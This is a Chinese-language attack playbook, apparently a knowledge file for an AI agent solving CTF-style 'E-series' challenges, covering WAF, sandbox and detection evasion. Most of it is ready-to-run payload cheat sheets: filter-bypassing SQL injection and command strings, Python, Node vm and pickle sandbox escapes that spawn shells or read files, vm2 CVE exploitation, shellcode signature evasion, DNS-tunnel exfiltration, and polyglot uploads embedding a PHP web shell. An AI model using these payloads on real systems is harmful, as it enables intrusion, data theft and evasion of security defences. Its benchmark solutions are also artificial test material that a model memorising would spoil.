# 对抗规避决策树（WAF / 沙箱 / 特征检测）

> 适用：E 系列对抗题——穿透 WAF、逃逸沙箱、构造特征规避制品。

### Adversarial Bypass Challenges (E-series)

E 系列是纯对抗题：不找业务漏洞，而是**穿透某种防御机制**——边界 WAF、执行沙箱、特征检测。题面通常会明说防御是什么（"部署了 Web 防护设备"、"沙箱限制"、"基于特征的检测"），破题关键是**识别防御类型 → 选对应的绕过原语**。本环境 E1/E2/E3 三个子系列共 14 题，全部命中。下面按防御类型给出信号→打法。

### E1: WAF / 边界过滤绕过

防御形态：nginx/ModSecurity/反向代理在请求进后端前做正则或签名匹配，命中黑名单返回 403。后端本身有经典漏洞（SQLi、命令注入、XSS），但教科书 payload 会被拦。**核心思路：WAF 是字符串匹配器，只要让 payload 的"形态"变了但"语义"不变就能过。**

#### 信号 → 打法（6/6 全解）

| 观察到 | 立即试 | 命中案例 |
|--------|--------|----------|
| WAF 拦 `OR 1=1`、`' OR '1'='1` 这种教科书 SQLi | **换等价表达式**：`OR 2=2`、`OR 9=9`（很多 WAF 只把 `1=1` 加进了签名）；或 `'+OR+'2'='2'`。先试数字变体再试结构变体 | e1-05：`' OR 2=2 --` 绕过只拦 `1=1` 的 WAF |
| WAF 拦 `OR`、`--`、`UNION SELECT` 这些关键字本身 | **内联注释切碎关键字**：`OR/**/1=1`——MySQL 把 `/**/` 当空格，正则 `OR\s*\d+=\d+` 匹配不上 | e1-04：`admin'+OR/**/1=1+--+-` 绕过拦 `OR 1=1` 的 nginx WAF |
| WAF 拦注释符 `--`、`#`，但后端是 MySQL/SQLite（支持 stacked query） | **用 `;--` 或 `';--` stacked-query 注释**：`username=admin';--&password=x`——分号结束原查询，`--` 注释掉剩余部分，整条 SQL 提前闭合 | e1-01：`admin';--` 绕过拦 `--`/`OR 1=1`/`UNION SELECT` 的 ModSecurity CRS |
| 题面 hint "Chunked Encoding"、"gzip"、"分块传输" | **Transfer-Encoding: chunked** 手动分块发 payload，很多 WAF 不重组分块就检测；或 `Content-Encoding: gzip` 压缩 body。但注意：有些题 hint 是红鲱鱼，经典 payload 本身就能过——**先试简单 payload 再试 hint 路线** | e1-06：hint 说是 gzip 绕过，实际 `admin' OR 1=1--` 直接就过了 |
| 运维面板/诊断工具，WAF 是关键字 denylist（拦 `cat`/`ls`/`sh`/`nc`/`curl`） | **找 denylist 没拦的等价命令**：`head`/`tail`/`more`/`less`/`od`/`xxd`/`tac`/`nl` 读文件；`find`/`locate` 找文件；`/bin/cat` 全路径调用；`awk '{print}'` 代替 cat | e1-03：WAF 拦 `cat`，用 `head /challenge/flag1.txt` 读 flag |
| 反馈/搜索站点，"后端会回显用户提交的内容" | **先 curl 看 HTTP 响应头/cookie**——flag 可能根本不在漏洞里，而是直接泄漏在响应里（Set-Cookie、自定义 header、隐藏 div）。回显型站点常把 flag 藏在 session cookie 的 URL 编码里 | e1-02：flag 直接在根路径响应的 `Set-Cookie: session_token=flag%7B...%7D` 里 |

#### WAF 绕过 payload 速查（按"被拦特征"索引）

```
被拦 "OR 1=1"        → ' OR 2=2 -- / ' OR 9=9 -- / ' OR 'a'='a
被拦 "OR" 关键字     → '+OR/**/1=1+-- / '/**/OR/**/1=1
被拦 "--" 注释       → admin';--  (stacked) / ' OR 1=1#  (MySQL #) / ' OR 1=1'%23
被拦 "UNION SELECT"  → /*!50000UNION*//*!50000SELECT*/ / UNIunionON SELselectECT
被拦 "cat/ls/sh"     → head / tac / more / less / od / xxd / awk / /bin/cat
被拦 单引号          → 宽字节 %bf%27 / 双写 \\' / Unicode ＇
HTTP 层绕过          → Transfer-Encoding: chunked / Content-Encoding: gzip / HTTP/1.0 / 大小写变换
```

**关键心态**：WAF 题几乎都有一发"简单 payload 就过"的解，hint 提到的复杂绕过（分块/gzip）经常是干扰项。**先 curl 一发 `admin' OR 1=1--`，被拦再升级。** 不要一上来就构造 chunked encoding。

### E2: 沙箱逃逸（Python / JS / 反序列化）

防御形态：服务端提供代码执行服务，但用某种沙箱限制——Python 限制 builtins、JS 用 `vm`/`vm2` 隔离、反序列化用白名单 unpickler。flag 在文件系统里（`/challenge/flag1.txt`），逃出沙箱读文件即可。**核心思路：所有沙箱的根本弱点是"语言自省能力无法被完全封锁"——只要能拿到 `object`，就能沿 `__subclasses__()` 链找到能执行命令的类。**

#### 信号 → 打法（4/4 全解）

| 观察到 | 立即试 | 命中案例 |
|--------|--------|----------|
| Python 沙箱，禁了 `import`/`open`/`__import__`，但没禁 `__class__`/`__subclasses__` | **MRO 链逃逸**：`"".__class__.__mro__[1].__subclasses__()` 列出所有 object 子类，找 `os._wrap_close`（或 `subprocess.Popen`、`warnings.catch_warnings`），再 `[c for c in ... if 'wrap_close' in c.__name__][0].__init__.__globals__['popen']('cat /challenge/flag1.txt').read()` | e2-01：builtins 受限，走 `os._wrap_close.__init__.__globals__` 拿到 `os.popen` |
| Python 沙箱，连 `_`、`[`、`]` 都禁了（字符级过滤） | **字符拼装**：`chr(95)+chr(95)` 拼 `__`；`globals().get(chr(95)*2+'class'+chr(95)*2)` 代替 `__class__`；`getattr(obj, 'sub'+'classes')` 代替点号；字符串切 `'imp'+'ort'` 绕关键字黑名单 | a-12：禁 `_`/`[`/`]`/`import`/`open`/`exec`，用 `chr(95)`+`globals().get()`+`getattr()` 全绕 |
| 服务端反序列化 pickle，但用了 `RestrictedUnpickler` 白名单（只允许 int/str/list/dict/getattr 等基础类型） | **白名单里有 `getattr`/`type` 就够逃逸**：手写 protocol 0 的 pickle 字节码，链式 `find_global`：`getattr(type,'__base__')`→object→`getattr(object,'__subclasses__')()`→找到 `os._wrap_close`→`__init__.__globals__['popen']`。关键：**不依赖 pickle 的 REDUCE opcode 调被禁函数，而是用允许的 getattr 一步步够到 os 模块** | e2-02：RestrictedUnpickler 白名单含 getattr，手写 protocol 0 字节码链式 getattr 逃逸 |
| Node.js `vm.runInNewContext` 沙箱（原生 vm 模块） | **经典 vm 逃逸一行链**：`this.constructor.constructor("return process")().mainModule.require("child_process").execSync("cat /challenge/flag1.txt")`。原理：vm 沙箱里的对象仍有 `constructor`，沿 `constructor.constructor`（即 `Function`）能拿到沙箱外的 Function，`Function("return process")` 在主上下文执行，拿到 process → require → child_process | e2-03：`this.constructor.constructor(...)` 一行链逃出原生 vm |
| Node.js `vm2` 沙箱（第三方增强沙箱，原生 vm 逃逸已被堵） | **vm2 有已知 CVE，直接查 PoC**：`vm2@3.6.x` 有 CVE-2023-32314 等，用 `Symbol.for('nodejs.util.inspect.custom')` + `WebAssembly.compileStreaming()`（或 `Proxy`/`getPrototypeOf` 链）够到 host 的 process。**别手撕 vm2，直接 grep PoC 库或 hacktricks**：`grep -r "vm2" /home/kali/pocs/ /home/kali/knowledges/` | e2-04：CVE-2023-32314，`Symbol.for('nodejs.util.inspect.custom')` + `WebAssembly.compileStreaming()` |
| 题面说"第三方沙箱组件"（vm2、pyvm、quickjs 等） | **这类沙箱基本都有公开 CVE，不会让你手撕**。第一步：`npm list`/`pip list` 查版本 → 搜 CVE → 找现成 PoC。`/home/kali/pocs/` 和 hacktricks 是首选 | e2-04：识别为 vm2 → 查 CVE → 拿现成 PoC |

#### 沙箱逃逸 payload 速查

**Python builtins 受限：**
```python
# 1. 找 os._wrap_close（最可靠，几乎每个 Python3 都有）
[c for c in ().__class__.__bases__[0].__subclasses__() if 'wrap_close' in c.__name__][0].__init__.__globals__['system']('sh')

# 2. 字符被过滤时用 chr + getattr 拼装
g = globals(); o = g.get(chr(95)*2+'builtins'+chr(95)*2)
getattr(o, chr(95)*2+'import'+chr(95)*2)('os').system('cat /flag')
```

**JS vm（原生）一行链：**
```javascript
this.constructor.constructor("return process")().mainModule.require("child_process").execSync("cat /challenge/flag1.txt").toString()
```

**pickle 白名单逃逸（ATX e2-02 实战验证的完整 opcode 链）：**
```python
# 白名单只允许 find_class 通过 builtins.getattr / builtins.type 等基础类
# 核心思路：用 getattr + type 两条白名单函数，靠 opcode 链恢复 open
#
# 1. 先枚举白名单：对候选(module,name)发 GLOBAL+EMPTY_TUPLE+REDUCE+STOP
#    响应不含 "Forbidden" = 允许。通常 getattr/type/dict/list/str 都放行
# 2. 完整链（纯 opcode，不用任何被禁的 GLOBAL）：
#    getattr(type, '__base__')           → object 类
#    getattr(object, '__subclasses__')()  → 全部已加载类列表
#    classes[N].__init__.__globals__      → 某模块 globals dict
#    globals['__builtins__']              → builtins dict
#    builtins['open']                     → open 函数
#    open('/challenge/flag.txt').read()   → flag（响应直接回显）
# 3. 关键教训：手搓 opcode 一定先用 pickletools.dis 本地验证再发服务端
#    X(0x58=BINUNICODE 4字节长度) ≠ \x8c(0x8c=SHORT_BINUNICODE 1字节长度)
```

**关键心态**：
- 沙箱逃逸的 flag 几乎都在 `/challenge/flag1.txt`——逃出后第一件事 `cat /challenge/flag1.txt`，别在沙箱里找
- Python 沙箱先试 `__subclasses__` 链，95% 的题都能用；不行再试字符拼装
- JS 沙箱：原生 vm 一行链必中；vm2/quickjs 这类第三方直接查 CVE，别手撕
- 反序列化白名单只要有 `getattr` 或 `type`，就等于沙箱没关——链式够到 os 即可

### E3: 特征检测 / 制品构造（构造类对抗题）

这类题不找漏洞，而是**构造一个能绕过检测机制的制品**。题目通常给一个 `/check` 或 `/upload` 端点，提交代码/二进制/文件后服务端跑一组检测规则，绕过比例达标就发 flag。**双轨评分**：flag + 制品质量，所以不仅要过线，还要尽量优雅。

#### 通用破题节奏（E3 构造类）

1. **先弄清检测的是什么**：提交一个明显恶意的样本（`system("id")`、`exec /bin/sh`、`<?php system($_GET[0]);?>`），看返回里有没有提示"命中了哪些规则 / 哪些 heuristic"。很多服务会在 JSON 里列出命中项，这等于直接告诉你规则集。
2. **逐条规则攻破**：把检测项当 checklist，每绕一条记一分。目标是过线（通常 ≥60%），不是全绕。
3. **优先用"功能等价但形态不同"的替代**：检测器多半基于字符串/特征/API 名匹配，换一个等价写法就绕了。

#### 信号 → 打法（4/4 全解，E3 构造类）

| 观察到 | 立即试 | 命中案例 |
|--------|--------|----------|
| 题目说"基于特征的二进制检测"、YARA rule、shellcode 检测 | YARA 多匹配 `syscall` 指令序列（`0f05`）或 `int 0x80`。用**等价但字节不同**的指令达到同样效果：`xor rdi,rdi; xor rsi,rsi; xor rdx,rdx`（`4831ff4831f64831d2`）清空寄存器准备 `execve`，避开直接的 syscall 字节特征。先 `pwn asm` 看每条指令的编码再挑 | e3-01：用 `4831ff4831f64831d2` 绕过 YARA syscall 签名 |
| "对常规出站通道管控，但有隐蔽通道可用" + 提到 DNS | **DNS 隧道外带**：(1) 找 `/target-data` 类端点拿到要外带的数据；(2) 切成 30 字节块，base32 编码（DNS label 只允许字母数字，base32 最稳）；(3) POST `seq-total-chunk.exfil.local` 到 `/dns` 端点，带 session id 串起顺序；(4) GET `/retrieve?session=<id>` 看是否 `complete:true` 返回 flag | e3-02：902 字节文档分 31 块，DNS 隧道外带后 `/retrieve` 发 flag |
| "文件类型校验"、"多重格式语义" | **构造 polyglot 文件**——同一个文件被两种解析器都认作合法格式。最经典的是 **PNG + ZIP**：合法的 1×1 PNG（`89 50 4e 47...`）后面 append 一个 ZIP（`50 4b 03 04...`）。PNG 解析器读头部，ZIP 解析器从中央目录（文件末尾）倒着找。上传后服务端检测"主格式 PNG + 次格式 ZIP"就判 bypassed | e3-03：1×1 PNG + append ZIP（含 flag.txt），193 字节，触发双格式检测 |
| "可疑代码行为检测"、Python 进程注入/heuristic 评分 | 检测器通常匹配**已知危险 API 名**（`ptrace`、`process_vm_readv`、`CreateRemoteThread`）和**跨进程内存操作**。换用**检测器不认识的等价 API**：`memfd_create`（创建匿名内存文件）+ `signal.signal()` 注册 handler，绕掉"危险 API 名"和"跨进程内存"两类规则。目标只要过 60%（3/5），不用全绕 | e3-04：`memfd_create` + signal 绕过 3/5 heuristic，0.6 评分过线 |

#### 构造类技巧速查

- **shellcode 字节级绕过**：`pwn asm 'xor rdi,rdi'` 看编码；避免 `0f05`(syscall)、`cd80`(int 0x80)、`687f`(push 0x7f) 这些常见 bad bytes；用 XOR 编码自解码 stub
- **polyglot 模板**：
  ```
  PNG+ZIP:  <89 PNG header...IEND>\n<ZIP local file header...central dir...EOCD>
  JPEG+PHP: <FF D8 ... JPEG data>\n<?php system($_GET[0]);?>   (PHP 解析器从 <? 开始)
  PDF+ZIP:  %PDF-1.4...\n%%EOF\n<ZIP appended>
  GIF+PHP:  GIF89a<?php ...?>   (最小 PHP gif)
  ```
- **polyglot 首选注释块嵌第二格式**（ATX e3-03 高质量方案）：GIF 注释块 / PNG tEXt 块 / JPEG COM 段 可嵌任意第二格式数据——注释块对宿主格式无害、对第二格式是合法载荷。比简单的 append 更优雅，双轨评分里质量分更高
- **Python 行为检测绕过**：避免 `import ctypes; ctypes.CDLL` 这类显式调用；用 `memfd_create`（`ctypes._dlopen` 别名）、`os.memfd_create`（3.17+ 原生）、`signal` 模块注册回调，这些通常不在 heuristic 黑名单里
- **正则/关键词检测绕过**：字符串拼接（`'sys'+'tem'`）、`chr()` 拼接（`chr(115)+chr(121)+...`）、`getattr(os, 'sys'+'tem')`、base64 解码执行（`__import__('base64').b64decode(b'...').decode()`）

#### 关键心态

- **先交一个最简样本探规则**，别一上来就构造复杂 payload——你需要知道检测器到底卡什么。第一发失败的提交也很有价值（看它 reject 了什么）。
- **过线即可，别追求满分**。双轨评分里"质量分"是锦上添花，flag 是主菜。60% 绕过 → 拿 flag → 再优化，比死磕 100% 绕过强。
- **polyglot 的核心是"两种解析器从不同位置/不同签名找结构"**，不是塞两种内容。ZIP 从文件末尾找 EOCD，所以 append 到任何文件后面都能被 ZIP 识别——这是 polyglot 最常利用的特性。

## E3 规避技术信号识别（题型→方向速查）

> 对抗规避题中，题面描述和靶场环境特征直接指向具体规避技术。看到以下信号时优先尝试对应方向。

| 环境信号 / 题面关键词 | 规避技术 | 方向 |
|---------------------|---------|------|
| 安全检测、恶意软件分析、YARA、规则匹配 | YARA 规则规避 | 分析检测器匹配的特征字符串或字节序列，用编码、XOR、分段拼接、空白字符插入打乱特征 |
| 数据外发限制、出站过滤、无法直接回传 | DNS 隧道外发 | 将 flag 编码为子域名标签通过 DNS 查询分块发送，用 xxd 转 hex 后按 63 字符切段拼到域名前缀 |
| 文件类型检测、内容审查、格式校验 | Polyglot 文件 | 构造同时满足两种格式解析器的文件，利用 ZIP 从尾部找 EOCD 的特性将恶意载荷 append 到合法文件后 |
| 进程保护、注入检测、EDR、行为监控 | 最小化进程注入 | 用极简注入路径绕过行为检测，优先 ptrace 附着或 process_vm_readv 远程读取，避免创建远程线程等高敏操作 |
| 沙箱限制、代码执行受限、eval blocked | VM 沙箱逃逸 | 识别沙箱类型后查已知逃逸路径：NodeJS vm 用 constructor 链逃逸，vm2 查已知 CVE 链，Python literal_eval 用类型注入 |
